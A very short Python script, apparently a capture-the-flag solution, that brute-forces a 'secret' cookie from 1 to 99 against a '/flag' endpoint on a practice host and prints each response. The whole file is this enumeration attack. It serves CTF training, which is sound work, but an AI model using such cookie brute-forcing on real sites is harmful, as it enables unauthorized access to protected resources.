import requests
url='https://cookies.acmcyber.com/flag'
for i in range(1,100):
    cookies={"secret":str(i)}
    r=requests.get(url,cookies=cookies)
    print(r.text)
